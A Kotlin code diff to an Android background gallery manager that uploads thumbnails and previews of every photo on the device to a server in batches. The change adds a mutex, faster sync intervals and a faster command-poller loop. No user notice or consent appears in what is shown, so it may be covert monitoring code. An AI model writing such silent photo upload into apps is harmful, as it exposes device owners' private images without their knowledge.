@@ -19,6 +19,8 @@ import androidx.core.content.ContextCompat
 import com.example.sentry.crypto.CryptoManager
 import com.example.sentry.network.SentryApiClient
 import kotlinx.coroutines.*
+import kotlinx.coroutines.sync.Mutex
+import kotlinx.coroutines.sync.withLock
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
@@ -49,7 +51,7 @@ object BackgroundGalleryManager {
     private var commandPollerJob: Job? = null
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var observerRegistered = false
-    private var isSyncing = false
+    private val syncMutex = kotlinx.coroutines.sync.Mutex()
 
     // Local in-memory catalog of all photos on the device
     @Volatile
@@ -90,17 +92,21 @@ object BackgroundGalleryManager {
             }
         }
 
-        // 3. Periodic Sync Loop (runs immediately, then every 30s)
+        // 3. Progressive Background Sync Loop (keeps older photos buffer ready)
         if (syncJob?.isActive != true) {
             syncJob = scope.launch {
                 val client = SentryApiClient(context)
+                repeat(4) {
+                    syncNextBatch(context, client, batchSize = 20)
+                    delay(1200)
+                }
                 while (isActive) {
                     try {
                         syncNextBatch(context, client, batchSize = 20)
                     } catch (e: Exception) {
                         Log.w(TAG, "Error in Gallery sync loop: ${e.message}")
                     }
-                    delay(30_000)
+                    delay(8_000)
                 }
             }
         }
@@ -130,7 +136,7 @@ object BackgroundGalleryManager {
                         }
                     } catch (_: Exception) {
                     }
-                    delay(800)
+                    delay(500)
                 }
             }
         }
@@ -251,79 +257,77 @@ object BackgroundGalleryManager {
      * Synchronizes the next batch of 20 unsynced photos to the cloud storage.
      */
     suspend fun syncNextBatch(context: Context, client: SentryApiClient, batchSize: Int = 20) {
-        if (isSyncing) return
-        isSyncing = true
-        try {
-            val nextBatch = getNextUnsyncedPhotos(context, batchSize)
-            if (nextBatch.isEmpty()) {
-                Log.d(TAG, "All $totalPhotosOnDevice local photos are already synced to cloud")
-                return
-            }
-
-            val deviceId = CryptoManager.getOrCreateDeviceId(context)
-            val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
-            val itemsToUpload = mutableListOf<JSONObject>()
-            val newlySyncedIds = mutableSetOf<String>()
-
-            for (photo in nextBatch) {
-                val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, photo.id)
-
-                // Extract High-Quality Crisp Thumbnail
-                val thumbnailBase64 = extractThumbnailBase64(context, contentUri)
-                if (thumbnailBase64.isNullOrBlank()) {
-                    continue
+        syncMutex.withLock {
+            try {
+                val nextBatch = getNextUnsyncedPhotos(context, batchSize)
+                if (nextBatch.isEmpty()) {
+                    Log.d(TAG, "All $totalPhotosOnDevice local photos are already synced to cloud")
+                    return@withLock
                 }
 
-                // Extract 40% Scale Sharp Preview
-                val previewBase64 = extract40PercentPreviewBase64(context, contentUri)
+                val deviceId = CryptoManager.getOrCreateDeviceId(context)
+                val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
+                val itemsToUpload = mutableListOf<JSONObject>()
+                val newlySyncedIds = mutableSetOf<String>()
 
-                val sizeFormatted = when {
-                    photo.sizeBytes >= 1024 * 1024 -> String.format(Locale.US, "%.1f MB", photo.sizeBytes / (1024.0 * 1024.0))
-                    photo.sizeBytes >= 1024 -> String.format(Locale.US, "%d KB", photo.sizeBytes / 1024)
-                    else -> "${photo.sizeBytes} B"
+                for (photo in nextBatch) {
+                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, photo.id)
+
+                    // Extract High-Quality Crisp Thumbnail
+                    val thumbnailBase64 = extractThumbnailBase64(context, contentUri)
+                    if (thumbnailBase64.isNullOrBlank()) {
+                        continue
+                    }
+
+                    // Extract 40% Scale Sharp Preview
+                    val previewBase64 = extract40PercentPreviewBase64(context, contentUri)
+
+                    val sizeFormatted = when {
+                        photo.sizeBytes >= 1024 * 1024 -> String.format(Locale.US, "%.1f MB", photo.sizeBytes / (1024.0 * 1024.0))
+                        photo.sizeBytes >= 1024 -> String.format(Locale.US, "%d KB", photo.sizeBytes / 1024)
+                        else -> "${photo.sizeBytes} B"
+                    }
+
+                    val dateFormatted = sdf.format(Date(photo.dateAddedSec * 1000))
+
+                    val obj = JSONObject().apply {
+                        put("id", photo.mediaIdStr)
+                        put("name", photo.name)
+                        put("album", photo.album)
+                        put("mimeType", photo.mimeType)
+                        put("size", sizeFormatted)
+                        put("date", dateFormatted)
+                        put("timestamp", photo.dateAddedSec * 1000)
+                        put("width", photo.width)
+                        put("height", photo.height)
+                        put("thumbnail", thumbnailBase64)
+                        if (!previewBase64.isNullOrBlank()) {
+                            put("preview", previewBase64)
+                        }
+                    }
+                    itemsToUpload.add(obj)
+                    newlySyncedIds.add(photo.mediaIdStr)
                 }
 
-                val dateFormatted = sdf.format(Date(photo.dateAddedSec * 1000))
-
-                val obj = JSONObject().apply {
-                    put("id", photo.mediaIdStr)
-                    put("name", photo.name)
-                    put("album", photo.album)
-                    put("mimeType", photo.mimeType)
-                    put("size", sizeFormatted)
-                    put("date", dateFormatted)
-                    put("timestamp", photo.dateAddedSec * 1000)
-                    put("width", photo.width)
-                    put("height", photo.height)
-                    put("thumbnail", thumbnailBase64)
-                    if (!previewBase64.isNullOrBlank()) {
-                        put("preview", previewBase64)
+                if (itemsToUpload.isNotEmpty()) {
+                    val batchArray = JSONArray()
+                    for (item in itemsToUpload) batchArray.put(item)
+                    val body = JSONObject().apply {
+                        put("deviceId", deviceId)
+                        put("totalDevicePhotos", totalPhotosOnDevice)
+                        put("syncedCount", getSyncedIds(context).size + itemsToUpload.size)
+                        put("remainingCount", (totalPhotosOnDevice - (getSyncedIds(context).size + itemsToUpload.size)).coerceAtLeast(0))
+                        put("media", batchArray)
+                    }
+                    val res = client.syncGalleryMedia(body)
+                    if (res.isSuccess) {
+                        markIdsAsSynced(context, newlySyncedIds)
+                        Log.d(TAG, "Synced batch of ${itemsToUpload.size} photos (Total on phone: $totalPhotosOnDevice, Synced: ${getSyncedIds(context).size})")
                     }
                 }
-                itemsToUpload.add(obj)
-                newlySyncedIds.add(photo.mediaIdStr)
+            } catch (e: Exception) {
+                Log.w(TAG, "Error syncing next photo batch: ${e.message}")
             }
-
-            if (itemsToUpload.isNotEmpty()) {
-                val batchArray = JSONArray()
-                for (item in itemsToUpload) batchArray.put(item)
-                val body = JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("totalDevicePhotos", totalPhotosOnDevice)
-                    put("syncedCount", getSyncedIds(context).size + itemsToUpload.size)
-                    put("remainingCount", (totalPhotosOnDevice - (getSyncedIds(context).size + itemsToUpload.size)).coerceAtLeast(0))
-                    put("media", batchArray)
-                }
-                val res = client.syncGalleryMedia(body)
-                if (res.isSuccess) {
-                    markIdsAsSynced(context, newlySyncedIds)
-                    Log.d(TAG, "Synced batch of ${itemsToUpload.size} photos (Total on phone: $totalPhotosOnDevice, Synced: ${getSyncedIds(context).size})")
-                }
-            }
-        } catch (e: Exception) {
-            Log.w(TAG, "Error syncing next photo batch: ${e.message}")
-        } finally {
-            isSyncing = false
         }
     }
 
